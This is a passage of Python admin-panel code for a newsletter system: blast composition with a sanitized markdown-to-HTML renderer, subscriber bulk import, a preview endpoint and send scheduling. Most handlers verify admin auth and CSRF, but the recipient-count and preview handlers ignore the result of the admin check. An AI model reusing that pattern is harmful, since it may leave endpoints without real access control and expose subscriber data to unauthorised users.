            target_description=f"{affected} users",
            after={"action": action, "user_ids": user_ids[:50]},
        )
    except Exception:
        pass

    return RedirectResponse("/admin/users", status_code=302)


# ── /admin/newsletter ────────────────────────────────────────────────────
#
# One-off blast composer. Admin picks a (segment, frequency) filter,
# writes a markdown body + subject, and either sends now or schedules
# for a future timestamp. Confirmed subscribers matching the filter
# receive the rendered ``newsletter_blast`` template.
#
# The recurring weekly digest is a separate cron path; this is the
# manual surface for launch announcements, milestone hits, and the like.

_NEWSLETTER_SEGMENTS = ("all", "markets", "election", "climate", "intelligence")
_NEWSLETTER_FREQUENCIES = ("", "weekly", "monthly", "daily_spike")
_NEWSLETTER_SEGMENT_LABELS = {
    "all": "All segments",
    "markets": "Markets",
    "election": "Election",
    "climate": "Climate",
    "intelligence": "Intelligence",
}
_NEWSLETTER_FREQUENCY_LABELS = {
    "": "Any frequency",
    "weekly": "Weekly",
    "monthly": "Monthly",
    "daily_spike": "Daily spike",
}


def _newsletter_md_to_html(body_md: str) -> str:
    """Render the admin-composed markdown body into safe-ish HTML for the
    email body. Intentionally minimal: paragraphs, **bold**, *italic*,
    `code`, [link](url), bulleted lists, and headings (## / ###).

    Pulling a full markdown engine in here would expand the trust surface
    (some support raw HTML by default). The set below covers the 95% of
    what an announcement actually needs and lets us escape everything
    else, so a runaway "<script>" in a body never reaches a recipient.

    HIGH fix (XSS via raw_body_html in newsletter_blast.html): every
    return path here is fed into the email template via the ``raw_``
    prefix that skips HTML-escape, so a compromised admin account could
    otherwise mass-phish the subscriber list. The final pass runs the
    rendered HTML through ``sanitize_newsletter_html`` — an allowlist
    sanitizer that drops script/iframe/on*/javascript:/data: — so the
    outbound body is constrained to a tiny audited tag set regardless of
    what an attacker stuffs into the upstream markdown or what bugs
    sneak into the regex pipeline above.
    """
    from email_system.sanitizer import sanitize_newsletter_html
    safe = html.escape(body_md or "")

    # Headings — must run before paragraph wrapping.
    safe = re.sub(
        r"^### (.+)$",
        r'<h3 style="margin:20px 0 8px;font-size:15px;font-weight:600;color:#0d0d0d;">\1</h3>',
        safe,
        flags=re.MULTILINE,
    )
    safe = re.sub(
        r"^## (.+)$",
        r'<h2 style="margin:24px 0 12px;font-size:17px;font-weight:600;color:#0d0d0d;letter-spacing:-0.01em;">\1</h2>',
        safe,
        flags=re.MULTILINE,
    )

    # Inline: **bold**, *italic*, `code`, [text](url).
    safe = re.sub(r"\*\*([^\*]+)\*\*", r"<strong>\1</strong>", safe)
    safe = re.sub(r"(?<!\*)\*([^\*\n]+)\*(?!\*)", r"<em>\1</em>", safe)
    safe = re.sub(
        r"`([^`]+)`",
        r'<code style="background:#f3f3f3;padding:1px 4px;border-radius:3px;font-size:13px;">\1</code>',
        safe,
    )

    # Links — escape pass already neutered raw HTML, so href injection
    # via the URL is the only remaining surface. Restrict to http(s)/mailto.
    def _link_repl(m):
        text = m.group(1)
        url = m.group(2)
        if not re.match(r"^(https?://|mailto:)", url):
            return m.group(0)
        return (
            f'<a href="{url}" style="color:#0d0d0d;text-decoration:underline;">'
            f'{text}</a>'
        )

    safe = re.sub(r"\[([^\]]+)\]\(([^\)]+)\)", _link_repl, safe)

    # Bulleted lists — group consecutive "- foo" lines into a <ul>.
    def _list_repl(m):
        items = "".join(
            f'<li style="margin-bottom:4px;">{line[2:]}</li>'
            for line in m.group(0).split("\n") if line.startswith("- ")
        )
        return (
            '<ul style="margin:12px 0;padding-left:20px;color:#0d0d0d;">'
            f'{items}</ul>'
        )

    safe = re.sub(r"(?:^- .+(?:\n|$))+", _list_repl, safe, flags=re.MULTILINE)

    # Paragraph wrapping — split on blank lines.
    blocks = []
    for block in re.split(r"\n{2,}", safe.strip()):
        block = block.strip()
        if not block:
            continue
        if block.startswith(("<h", "<ul", "<ol")):
            blocks.append(block)
        else:
            block = block.replace("\n", "<br>")
            blocks.append(
                f'<p style="margin:0 0 16px;color:#0d0d0d;line-height:1.6;">'
                f'{block}</p>'
            )
    # Final allowlist pass. ``sanitize_newsletter_html`` only keeps
    # p/a/strong/em/ul/ol/li/br/h2/h3/img and drops the inline ``style``
    # attribute. The wrapper template in newsletter_blast.html owns the
    # visual frame, so losing per-tag inline styling here is intentional
    # — the email still renders, just without the markdown-renderer's
    # opinionated colors/padding on individual nodes. The win is that
    # ANYTHING that slipped through the regex pipeline above (script,
    # iframe, onclick, javascript: href, …) is now stripped before
    # reaching ``raw_body_html`` in the email template.
    return sanitize_newsletter_html("\n".join(blocks))


def _render_newsletter_history_rows(campaigns: list[dict]) -> str:
    """Render the past-campaigns table for the /admin/newsletter index.

    Each row shows subject, segment + frequency, scheduled/sent timestamps,
    and recipient count. The count cell uses Geist Mono via inline
    font-family — admin-shell.css doesn't auto-mono arbitrary spans.
    """
    if not campaigns:
        return (
            '<div class="admin-empty">'
            'No campaigns sent yet. Compose one below.</div>'
        )

    now = int(time.time())
    rows = []
    for c in campaigns:
        seg = _NEWSLETTER_SEGMENT_LABELS.get(c["segment"], c["segment"])
        freq_raw = c.get("frequency_filter") or ""
        freq = _NEWSLETTER_FREQUENCY_LABELS.get(
            freq_raw, freq_raw or "Any frequency",
        )
        sched_ts = int(c["scheduled_at"])
        sent_ts = c.get("sent_at")

        if sent_ts:
            status_html = (
                '<span class="badge" style="background:rgba(34,197,94,0.12);'
                'color:#22c55e">Sent</span>'
            )
            time_label = (
                f"Sent {html.escape(_fmt_ts(sent_ts, '%b %-d %H:%M UTC'))}"
            )
        elif sched_ts > now:
            status_html = (
                '<span class="badge" style="background:rgba(59,130,246,0.12);'
                'color:#3b82f6">Scheduled</span>'
            )
            time_label = (
                f"Fires {html.escape(_fmt_ts(sched_ts, '%b %-d %H:%M UTC'))}"
            )
        else:
            status_html = (
                '<span class="badge" style="background:var(--surface-hover);'
                'color:var(--text-muted)">Pending</span>'
            )
            time_label = (
                f"Queued {html.escape(_fmt_ts(sched_ts, '%b %-d %H:%M UTC'))}"
            )

        recipients = int(c.get("recipient_count") or 0)
        meta_parts = [html.escape(seg), html.escape(freq), time_label]
        rows.append(
            f'<div class="admin-row" data-campaign-id="{c["id"]}">'
            f'<div class="admin-row-info">'
            f'<div class="admin-row-main">'
            f'{html.escape(c["subject"])} {status_html}'
            f'</div>'
            f'<div class="admin-row-meta">'
            f'{" &middot; ".join(meta_parts)}</div></div>'
            f'<div class="admin-row-actions">'
            f'<span class="newsletter-count" '
            f'style="font-family:var(--font-mono);font-size:13px;'
            f'color:var(--text-secondary);">'
            f'{recipients:,} recipients</span>'
            f'</div>'
            f'</div>'
        )
    return "".join(rows)


def _render_newsletter_select(
    name: str, values, current: str, labels: dict,
) -> str:
    """Render a <select> for segment/frequency on the compose form."""
    options = []
    for v in values:
        sel = ' selected' if v == current else ''
        options.append(
            f'<option value="{html.escape(v)}"{sel}>'
            f'{html.escape(labels.get(v, v))}</option>'
        )
    return (
        f'<select id="{name}" name="{name}" class="newsletter-select">'
        + "".join(options)
        + "</select>"
    )


def _render_newsletter_import_section(
    csrf_field: str,
    *,
    import_status: str = "",
) -> str:
    """Render the CSV-paste import card above the past-campaigns section.

    Admins paste a newline-separated list of emails; the POST handler at
    ``/admin/newsletter/import`` parses, validates, dedupes against the
    existing ``newsletter_subscribers`` table, and inserts new rows with
    ``source='admin-import'`` + ``confirmed_at=now`` (no double-opt-in
    since the admin is asserting these are vetted addresses).

    Idempotent: re-pasting the same list inserts zero new rows. Returns
    a banner row with insert/skip/invalid counts after a successful POST
    (the ``import_status`` arg, already-escaped HTML) so the admin can
    see at a glance what happened.
    """
    banner = ""
    if import_status:
        banner = (
            '<div class="newsletter-import__banner" '
            'style="margin:0 0 12px;padding:8px 12px;'
            'border:1px solid var(--border-default);'
            'border-radius:var(--radius-sm,6px);'
            'background:var(--bg-surface);'
            'font-family:var(--font-ui);font-size:12.5px;'
            'color:var(--text-primary);">'
            + import_status +
            '</div>'
        )
    return (
        '<section class="admin-section newsletter-import" '
        'style="margin:0 0 24px;">'
        '<div class="admin-section-head">'
        '<h2 class="admin-section-title">Import subscribers</h2>'
        '<span class="admin-section-count">paste newline-separated emails</span>'
        '</div>'
        '<div class="admin-card" '
        'style="padding:14px 16px;'
        'border:1px solid var(--border-default);'
        'border-radius:var(--radius-md,8px);'
        'background:var(--bg-surface);">'
        + banner +
        '<form method="post" action="/admin/newsletter/import" '
        'class="newsletter-import__form" '
        'style="display:flex;flex-direction:column;gap:10px;'
        'font-family:var(--font-ui);">'
        + csrf_field +
        '<label class="newsletter-field" '
        'style="display:flex;flex-direction:column;gap:6px;">'
        '<span class="newsletter-field__label" '
        'style="font-size:11px;font-weight:600;'
        'text-transform:uppercase;letter-spacing:0.1em;'
        'color:var(--text-tertiary);">Emails</span>'
        '<textarea name="emails" rows="6" required '
        'maxlength="200000" '
        'placeholder="one@example.com&#10;two@example.com&#10;three@example.com" '
        'style="font-family:var(--font-mono);font-size:13px;'
        'padding:10px 12px;'
        'border:1px solid var(--border-default);'
        'border-radius:var(--radius-sm,6px);'
        'background:var(--bg-base);'
        'color:var(--text-primary);'
        'resize:vertical;min-height:120px;"></textarea>'
        '<span class="newsletter-field__hint" '
        'style="font-size:11.5px;color:var(--text-tertiary);">'
        'Paste up to ~5,000 addresses, one per line. Commas, semicolons, '
        'and whitespace also accepted as separators. Invalid lines are '
        'skipped; duplicates of existing subscribers are no-ops. New rows '
        'land with source=admin-import, confirmed_at=now.'
        '</span>'
        '</label>'
        '<div style="display:flex;justify-content:flex-end;">'
        '<button type="submit" class="btn btn-primary">Import</button>'
        '</div>'
        '</form>'
        '</div>'
        '</section>'
    )


def _newsletter_import_status_from_qp(qp) -> str:
    """Translate the ?imported/&skipped/&invalid querystring into a banner.

    Returns escaped HTML ready to drop into ``_render_newsletter_import_section``.
    """
    try:
        imported = max(0, int(qp.get("imported") or 0))
    except (TypeError, ValueError):
        imported = 0
    try:
        skipped = max(0, int(qp.get("skipped") or 0))
    except (TypeError, ValueError):
        skipped = 0
    try:
        invalid = max(0, int(qp.get("invalid") or 0))
    except (TypeError, ValueError):
        invalid = 0
    if imported == 0 and skipped == 0 and invalid == 0:
        return ""
    parts = [
        f"<strong>{imported:,}</strong> imported",
        f"<strong>{skipped:,}</strong> already subscribed",
        f"<strong>{invalid:,}</strong> invalid skipped",
    ]
    # All numbers are server-side ints so they're safe to interpolate into
    # HTML without escape.
    return " · ".join(parts)


# Email separator regex for CSV-paste import — splits on newlines, commas,
# semicolons, and any whitespace runs. Matches the textarea hint copy in
# ``_render_newsletter_import_section``.
_NEWSLETTER_IMPORT_SPLIT_RE = re.compile(r"[\s,;]+")

# Cap the per-POST import. 5,000 is plenty for an admin paste-job and keeps
# the SQLite tx + index walk bounded. Larger imports go through the proper
# CSV-upload path (out of scope here).
_NEWSLETTER_IMPORT_MAX = 5_000


async def newsletter_import_post(request: Request):
    """POST /admin/newsletter/import — paste-import newsletter subscribers.

    Body fields:
      * ``emails`` — newline/comma/semicolon-separated address list.

    Behaviour:
      * Splits on any whitespace/comma/semicolon run.
      * Lower-cases and trims each candidate.
      * Skips anything that fails ``is_valid_email``.
      * Inserts new rows with ``source='admin-import'`` and
        ``confirmed_at=now`` (admin asserts these are pre-vetted, so we
        bypass double-opt-in).
      * Duplicates of existing ``newsletter_subscribers.email`` are
        skipped via ``INSERT OR IGNORE`` so the operation is idempotent.

    Redirects back to ``/admin/newsletter`` with
    ``?imported=N&skipped=N&invalid=N`` so the page renders a banner.

    CSRF is double-checked in-handler on top of the middleware so a
    future middleware-exemption change can't silently expose this surface.
    Admin auth + mutation rate limit come from ``_require_admin_user``.
    """
    admin = _require_admin_user(request)
    if admin is None:
        return _denied_response(request)

    srv = _srv()
    form = await request.form()
    submitted = form.get(srv.CSRF_FORM_FIELD) or request.headers.get(
        getattr(srv, "CSRF_HEADER_NAME", "x-csrf-token")
    )
    if not srv._validate_csrf(request, submitted):
        raise HTTPException(status_code=403, detail="CSRF validation failed")

    raw = (form.get("emails") or "").strip()
    if not raw:
        return RedirectResponse("/admin/newsletter", status_code=302)

    candidates = [c.strip() for c in _NEWSLETTER_IMPORT_SPLIT_RE.split(raw) if c.strip()]
    if not candidates:
        return RedirectResponse("/admin/newsletter", status_code=302)

    # De-dupe within the paste itself so the counts don't double-bill the
    # admin for two copies of the same line.
    seen: set[str] = set()
    valid_emails: list[str] = []
    invalid_count = 0
    for c in candidates[: _NEWSLETTER_IMPORT_MAX]:
        lower = c.lower()
        if lower in seen:
            continue
        seen.add(lower)
        if not srv.is_valid_email(lower):
            invalid_count += 1
            continue
        valid_emails.append(lower)

    now = int(time.time())
    imported = 0
    skipped = 0
    if valid_emails:
        with db.conn() as c:
            # Probe existing rows in one IN-query so we can split
            # imported vs skipped counts cleanly. Chunks of 500 to stay
            # well under SQLite's parameter limit (default 999).
            existing: set[str] = set()
            for i in range(0, len(valid_emails), 500):
                chunk = valid_emails[i:i + 500]
                placeholders = ",".join("?" * len(chunk))
                for row in c.execute(
                    f"SELECT email FROM newsletter_subscribers "
                    f"WHERE email IN ({placeholders})",
                    chunk,
                ).fetchall():
                    existing.add((row["email"] or "").strip().lower())

            for email in valid_emails:
                if email in existing:
                    skipped += 1
                    continue
                try:
                    cur = c.execute(
                        "INSERT OR IGNORE INTO newsletter_subscribers "
                        "(email, subscribed_at, source, confirmed_at, "
                        " segment, frequency) "
                        "VALUES (?, ?, 'admin-import', ?, 'all', 'weekly')",
                        (email, now, now),
                    )
                    if (cur.rowcount or 0) > 0:
                        imported += 1
                    else:
                        # Lost the race to a concurrent insert.
                        skipped += 1
                except sqlite3.IntegrityError:
                    # Concurrent insert won the race — count as skipped.
                    skipped += 1

    # Best-effort audit log so this import is visible in /admin/audit-log.
    try:
        from security import audit as _a
        _audit(
            getattr(
                _a.AuditAction,
                "NEWSLETTER_IMPORT",
                "admin.newsletter.import",
            ),
            admin=admin, request=request,
            target_type="newsletter_subscribers",
            notes=(
                f"imported={imported} skipped={skipped} "
                f"invalid={invalid_count}"
            ),
        )
    except Exception:
        log.exception("newsletter import audit failed")

    redirect_qs = (
        f"imported={imported}&skipped={skipped}&invalid={invalid_count}"
    )
    return RedirectResponse(
        f"/admin/newsletter?{redirect_qs}", status_code=302,
    )


async def newsletter_page(request: Request):
    """GET /admin/newsletter — list past campaigns + compose form.

    Two-section page: past campaigns at top (newest first, paginated to
    the most recent 50), then the compose form below. The live recipient
    count for the currently selected filter is rendered server-side on
    initial load and refreshed by inline JS on filter change via
    /admin/newsletter/recipients.

    History filters (``q``, ``status``, ``since``, ``until``) are applied
    in Python over the raw campaign list so bookmarks repopulate the
    form. ``status=sent`` keeps rows with a ``sent_at`` timestamp;
    ``status=scheduled`` keeps the future-fire rows.
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    q = (qp.get("q") or "").strip()
    status_filter = (qp.get("status") or "").strip().lower()
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()

    if status_filter not in {"", "sent", "scheduled"}:
        status_filter = ""

    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        until_ts += 86_399

    # Pull a wider window than the rendered cap so the post-filter still
    # has something to show when the admin filters far back. 500 is plenty
    # — campaigns are rare events, not log lines.
    campaigns = db.list_newsletter_campaigns(limit=500)
    now_ts = int(time.time())

    def _keep(c: dict) -> bool:
        if q and q.lower() not in (c.get("subject") or "").lower():
            return False
        if status_filter:
            sent_at = c.get("sent_at")
            sched_at = int(c.get("scheduled_at") or 0)
            if status_filter == "sent" and not sent_at:
                return False
            if status_filter == "scheduled" and (sent_at or sched_at <= now_ts):
                return False
        ref_ts = int(c.get("sent_at") or c.get("scheduled_at") or 0)
        if since_ts is not None and ref_ts < since_ts:
            return False
        if until_ts is not None and ref_ts > until_ts:
            return False
        return True

    campaigns = [c for c in campaigns if _keep(c)][:50]
    history_rows = _render_newsletter_history_rows(campaigns)

    # Default-filter recipient count for the live preview.
    default_count = db.count_blast_recipients(
        segment="all", frequency_filter=None,
    )

    segment_select = _render_newsletter_select(
        "segment", _NEWSLETTER_SEGMENTS, "all",
        _NEWSLETTER_SEGMENT_LABELS,
    )
    frequency_select = _render_newsletter_select(
        "frequency_filter", _NEWSLETTER_FREQUENCIES, "",
        _NEWSLETTER_FREQUENCY_LABELS,
    )

    # CSRF token for the import form. Same pattern as other admin POSTs —
    # reuse the per-session cookie token if present, otherwise mint one.
    srv = _srv()
    try:
        csrf_token = (
            request.cookies.get(srv.CSRF_COOKIE_NAME)
            or getattr(getattr(request, "state", None), "csrf_token", None)
            or srv._generate_csrf_token()
        )
    except Exception:
        csrf_token = ""
    csrf_field = (
        f'<input type="hidden" name="{srv.CSRF_FORM_FIELD}" '
        f'value="{html.escape(csrf_token)}">'
        if csrf_token else ""
    )

    # Surface the import-result banner from ?imported=N&skipped=N&invalid=N
    # (populated by the POST /admin/newsletter/import redirect).
    import_status = _newsletter_import_status_from_qp(qp)

    import_section_html = _render_newsletter_import_section(
        csrf_field, import_status=import_status,
    )

    from admin_shell import render_admin_page
    return render_admin_page(
        request,
        "admin/newsletter.html",
        page_title="Newsletter blasts",
        active_route="newsletter",
        breadcrumb=[
            ("Admin", "/admin"),
            ("Newsletter", "/admin/newsletter"),
        ],
        raw_history_rows=history_rows,
        raw_segment_select=segment_select,
        raw_frequency_select=frequency_select,
        raw_import_section=import_section_html,
        recipient_count=f"{default_count:,}",
        filter_q=q,
        filter_status=status_filter,
        filter_since=since_str,
        filter_until=until_str,
        result_count=f"{len(campaigns):,}",
    )


async def newsletter_recipient_count_json(request: Request):
    """GET /admin/newsletter/recipients — JSON live count for compose.

    Admin-only. Used by the inline JS on the compose page to refresh
    "X recipients" when the segment/frequency dropdowns change without
    a full page reload.
    """
    _require_admin_user(request)
    qp = request.query_params
    segment = (qp.get("segment") or "all").strip().lower()
    frequency = (qp.get("frequency_filter") or "").strip().lower() or None
    count = db.count_blast_recipients(
        segment=segment, frequency_filter=frequency,
    )
    return JSONResponse({
        "count": int(count),
        "segment": segment,
        "frequency_filter": frequency,
    })


async def newsletter_preview(request: Request):
    """POST /admin/newsletter/preview — render the markdown body to HTML.

    Used by the inline "Preview" button on the compose form. Returns
    the rendered HTML body so the admin can sanity-check before sending.
    The sanitizer runs inside ``_newsletter_md_to_html`` so the preview
    matches what every recipient (inline send + deferred-tail worker)
    actually receives.
    """
    _require_admin_user(request)
    form = await request.form()
    body_md = form.get("body_md") or ""
    subject = (form.get("subject") or "").strip()
    return JSONResponse({
        "subject": subject,
        "body_html": _newsletter_md_to_html(body_md),
    })


async def newsletter_send(request: Request):
    """POST /admin/newsletter/send — compose-and-blast handler.

    Required form fields:
      * ``subject``           — non-empty subject line.
      * ``body_md``           — markdown body, rendered into HTML for send.
      * ``segment``           — one of ``_NEWSLETTER_SEGMENTS``.
      * ``frequency_filter``  — optional, weekly/monthly/daily_spike.
      * ``schedule``          — "now" or "later".
      * ``scheduled_at``      — required when schedule=="later". ISO 8601
                                 ``YYYY-MM-DDTHH:MM`` from the form's
                                 datetime-local input, interpreted as UTC.

    Behaviour:
      * ``schedule == "now"``    — enqueue an email per recipient via
                                    ``enqueue_email``, record the campaign
                                    with ``sent_at = now`` and the actual
                                    recipient_count.
      * ``schedule == "later"``  — record the campaign with
                                    ``scheduled_at`` set to the future ts
                                    and ``sent_at = NULL``. A future cron
                                    dispatches it — out of scope here.

    CSRF is enforced by the global middleware. Admin auth + per-admin
    mutation rate limit come from ``_require_admin_user``.
    """
    admin = _require_admin_user(request)
    form = await request.form()

    subject = (form.get("subject") or "").strip()
    body_md = form.get("body_md") or ""
    segment = (form.get("segment") or "all").strip().lower()
    frequency_filter = (
        (form.get("frequency_filter") or "").strip().lower() or None
    )
    schedule = (form.get("schedule") or "now").strip().lower()
    scheduled_at_str = (form.get("scheduled_at") or "").strip()

    if not subject:
        raise HTTPException(status_code=400, detail="Subject is required")
    if not body_md.strip():
        raise HTTPException(status_code=400, detail="Body is required")
    if segment not in _NEWSLETTER_SEGMENTS:
        raise HTTPException(status_code=400, detail="Invalid segment")
    if frequency_filter is not None and frequency_filter not in (
        "weekly", "monthly", "daily_spike",
    ):
        raise HTTPException(
            status_code=400, detail="Invalid frequency filter",
        )

    now = int(time.time())

    # Resolve scheduled_at — "now" snaps to current time; "later" parses
    # the datetime-local input as UTC. The form has no TZ picker so the
    # contract is "what you type, in UTC". Admin pages already render
    # timestamps with the UTC suffix throughout.
    if schedule == "later":
        if not scheduled_at_str:
            raise HTTPException(
                status_code=400, detail="Scheduled time required",
            )
        try:
            dt = _dt.datetime.fromisoformat(scheduled_at_str)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=_dt.timezone.utc)
            scheduled_at = int(dt.timestamp())
        except ValueError:
            raise HTTPException(
                status_code=400, detail="Invalid scheduled time",
            )
        if scheduled_at <= now:
            raise HTTPException(
                status_code=400,
                detail="Scheduled time must be in the future",
            )
    else:
        scheduled_at = now

    # Bound the synchronous portion. Audit #12 MED #1: the original
    # handler walked every confirmed subscriber inside the request and
    # awaited an enqueue per row. With 100k+ subscribers that's 100k DB
    # writes on the admin POST path, easily blowing the worker timeout.
    #
    # Now: count the full recipient set, page the first
    # MAX_INLINE_RECIPIENTS inline, and defer the rest as a row in
    # ``newsletter_blast_jobs``. A cron tick
    # (jobs/newsletter_blast_jobs.py::newsletter_blast_tick) drains the
    # deferred tail one batch per minute.
    recipient_count = db.count_blast_recipients(
        segment=segment, frequency_filter=frequency_filter,
    )

    inline_cap = int(db.NEWSLETTER_MAX_INLINE_RECIPIENTS)
    inline_target = min(recipient_count, inline_cap) if schedule == "now" else 0
    deferred_target = (
        max(0, recipient_count - inline_target)
        if schedule == "now" else 0
    )

    sent_at: int | None
    immediate_enqueued = 0
    if schedule == "now":
        # Render the markdown body once — every enqueued recipient gets
        # the same HTML so we don't repeat the regex passes per send.
        # ``_newsletter_md_to_html`` now runs the rendered HTML through
        # ``sanitize_newsletter_html`` (HIGH XSS fix), so the body that
        # lands in ``raw_body_html`` is constrained to the allowlist
        # even though the email template skips HTML-escape via the
        # ``raw_`` prefix convention.
        body_html_str = _newsletter_md_to_html(body_md)
        from jobs.email_jobs import enqueue_email

        if inline_target > 0:
            inline_rows = db.get_blast_recipients_page(
                segment=segment, frequency_filter=frequency_filter,
                offset=0, limit=inline_target,
            )
            for row in inline_rows:
                try:
                    await enqueue_email(
                        to=row["email"],
                        template="newsletter_blast",
                        context={
                            "subject": subject,
                            # raw_-prefixed so the renderer skips HTML-
                            # escape: the markdown→HTML pass already
                            # produced trusted HTML, and this value is
                            # admin-authored.
                            "raw_body_html": body_html_str,
                        },
                        tags=["newsletter_blast", f"segment:{segment}"],
                    )
                    immediate_enqueued += 1
                except Exception as exc:
                    log.warning(
                        "newsletter blast enqueue failed for %s: %s",
                        row["email"], exc,
                    )
        # ``sent_at`` reflects "the blast has left the building" — for
        # bounded sends we stamp it once the inline portion is enqueued
        # iff there is no deferred tail. Otherwise the tick worker
        # backfills ``sent_at`` when the tail finishes.
        sent_at = now if deferred_target == 0 else None
    else:
        sent_at = None  # picked up by the scheduled-dispatch cron later.

    campaign_id = db.record_newsletter_campaign(
        admin_user_id=int(admin.get("user_id") or 0),
        subject=subject,
        body_md=body_md,
        segment=segment,
        frequency_filter=frequency_filter,
        scheduled_at=scheduled_at,
        sent_at=sent_at,
        recipient_count=recipient_count,
    )

    deferred_job_id: int | None = None
    if schedule == "now" and deferred_target > 0:
        deferred_job_id = db.create_blast_job(
            campaign_id=campaign_id,
            total_recipients=deferred_target,
        )

    _audit(
        "newsletter.blast_send" if schedule == "now"
        else "newsletter.blast_schedule",
        admin=admin, request=request,
        target_type="newsletter_campaign", target_id=str(campaign_id),
        target_description=f"{recipient_count} recipients · {segment}",
        after={
            "segment": segment,
            "frequency_filter": frequency_filter,
            "scheduled_at": scheduled_at,
            "recipient_count": recipient_count,
            "immediate_enqueued": immediate_enqueued,
            "queued_count": deferred_target,
            "blast_job_id": deferred_job_id,
        },
    )

    # JSON callers (tests, future admin tooling) get the bounded counts
    # back so they can verify the deferred-tail flip without inspecting
    # the DB directly. The form submit is redirected to the page so the
    # existing admin UX is unchanged.
    accept = (request.headers.get("accept") or "").lower()
    if "application/json" in accept:
        return JSONResponse({
            "ok": True,
            "campaign_id": campaign_id,
            "recipient_count": recipient_count,
            "immediate_enqueued": immediate_enqueued,
            "queued_count": deferred_target,
            "blast_job_id": deferred_job_id,
            "status": "queued" if deferred_target > 0 else "sent",
        })

    return RedirectResponse("/admin/newsletter", status_code=302)


# ── /admin/email-addresses ───────────────────────────────────────────────
#
# Unified aggregator over every email-collection surface on the platform:
# newsletter subscribers (active + unsubscribed + prerelease), registered
# users + admin-created shell rows, contact enquiries, feedback submitters,
# outbound email-queue recipients, and invite-token targets. 9 sources,
# one searchable + exportable table.
#
# Data layer: ``db.aggregate_email_addresses`` and
# ``db.count_email_addresses_by_source`` (queries/admin.py).
# Auth: admin gate, matches /admin/newsletter (super-admin sessions only
# clear ``_require_admin_user``'s 2FA gate; vanilla logged-in users 403).


_EMAIL_SOURCE_LABELS = (
    "newsletter", "user", "enquiry", "feedback", "prerelease",
    "shell", "outbound", "unsubscribe", "invite",
)


_EMAIL_STATUS_LABELS = (
    "active", "confirmed", "pending", "unsubscribed",
    "suspended", "queued", "complete", "failed", "unclaimed",
)


# Column definitions for the email-addresses table. Order = render order.
#   key:       the sort-key value sent as ?sort=<key>
#   label:     visible header text
#   th_class:  CSS modifier on the <th>
#   sortable:  whether to render the column as a clickable sort anchor
_EMAIL_TABLE_COLUMNS = (
    ("email",      "Email",         "adm-ea-th--email",  True),
    ("source",     "Source",        "adm-ea-th--source", True),
    ("first_seen", "First seen",    "adm-ea-th--ts",     True),
    ("ts",         "Last activity", "adm-ea-th--ts",     True),
    ("user_id",    "User",          "adm-ea-th--uid",    True),
    ("status",     "Status",        "adm-ea-th--status", True),
)


def _render_email_sort_headers(active_sort: str, active_dir: str, filter_qs: str) -> str:
    """Build the sortable `<th>` row for the email-addresses table.

    Each header is an anchor that toggles direction when clicked on the
    already-active column, or jumps to `desc` when clicked on a new one
    (so dates default newest-first, alphabetics default A→Z via the asc
    toggle on second click). Preserves the active filter set in the query
    string so sorting doesn't drop filters.

    Prepends a non-sortable bulk-select column whose <th> hosts the
    "select all" checkbox; the JS in ``email_addresses.html`` watches
    ``[data-bulk-select-all]`` and propagates the change to every
    ``[data-bulk-select]`` row checkbox.
    """
    parts = [
        '<th scope="col" class="adm-ea-th adm-ea-th--select">'
        '<input type="checkbox" data-bulk-select-all '
        'aria-label="Select all rows on this page">'
        '</th>'
    ]
    for key, label, css, sortable in _EMAIL_TABLE_COLUMNS:
        if not sortable:
            parts.append(
                f'<th scope="col" class="adm-ea-th {css}">{html.escape(label)}</th>'
            )
            continue
        is_active = key == active_sort
        # Click-toggle: if already active, flip dir; otherwise default to desc.
        next_dir = ("asc" if active_dir == "desc" else "desc") if is_active else "desc"
        arrow = ""
        if is_active:
            arrow = ' <span class="adm-ea-sort-arrow" aria-hidden="true">' + (
                "↓" if active_dir == "desc" else "↑"
            ) + "</span>"
        aria_sort = "none"
        if is_active:
            aria_sort = "descending" if active_dir == "desc" else "ascending"
        # Build the link's querystring on top of the active filter set.
        sep = "&" if filter_qs else ""
        href = f"?{filter_qs}{sep}sort={key}&dir={next_dir}"
        cls = f"adm-ea-th {css}" + (" adm-ea-th--active" if is_active else "")
        parts.append(
            f'<th scope="col" class="{cls}" aria-sort="{aria_sort}">'
            f'<a class="adm-ea-th-link" href="{html.escape(href)}">'
            f'{html.escape(label)}{arrow}</a></th>'
        )
    return "".join(parts)


def _fmt_email_addresses_ts(ts) -> str:
    """Format a unix-seconds timestamp as ``YYYY-MM-DD HH:MM`` UTC.

    Returns ``"—"`` for None/0 so the table reads cleanly when a source
    didn't have a timestamp. Matches the date formatting used elsewhere
    in the admin surface (e.g. /admin/users).

    Distinct from the top-level ``_fmt_ts`` (line ~113) which takes a
    custom ``fmt`` arg — earlier this was named ``_fmt_ts`` too and
    shadowed the general helper, breaking every caller that passed a
    format string (e.g. /admin/users, /admin/jobs CSV export).
    """
    if not ts:
        return "—"
    try:
        return _dt.datetime.utcfromtimestamp(int(ts)).strftime("%Y-%m-%d %H:%M")
    except (TypeError, ValueError, OverflowError):
        return "—"


def _parse_date_to_ts(s) -> int | None:
    """Parse ``YYYY-MM-DD`` from the form into unix seconds (start-of-day UTC).

    Returns None on empty or malformed input — the caller treats None as
    "no bound", so a bad date silently disables the filter rather than 400ing.
    """
    if not s:
        return None
    s = str(s).strip()
    if not s:
        return None
    try:
        return int(_dt.datetime.strptime(s, "%Y-%m-%d")
                   .replace(tzinfo=_dt.timezone.utc).timestamp())
    except (TypeError, ValueError):
        return None


def _render_email_source_options(active: str) -> str:
    """Build the <option> list for the source-filter dropdown.

    Renders verbatim through the template's ``raw_source_options`` slot.
    All values flow through ``html.escape`` for defence-in-depth even
    though the labels are static.
    """
    out = ['<option value="">All sources</option>']
    for label in _EMAIL_SOURCE_LABELS:
        sel = " selected" if active == label else ""
        out.append(
            f'<option value="{html.escape(label)}"{sel}>'
            f'{html.escape(label)}</option>'
        )
    return "".join(out)


def _render_email_status_options(active: str) -> str:
    """Build the <option> list for the status-filter dropdown."""
    out = ['<option value="">Any status</option>']
    for label in _EMAIL_STATUS_LABELS:
        sel = " selected" if active == label else ""
        out.append(
            f'<option value="{html.escape(label)}"{sel}>'
            f'{html.escape(label)}</option>'
        )
    return "".join(out)


def _render_email_totals_badges(counts: dict) -> str:
    """Render the source-totals badge row across the top of the table.

    Order follows ``_EMAIL_SOURCE_LABELS`` so the visual rhythm matches
    the filter dropdown.
    """
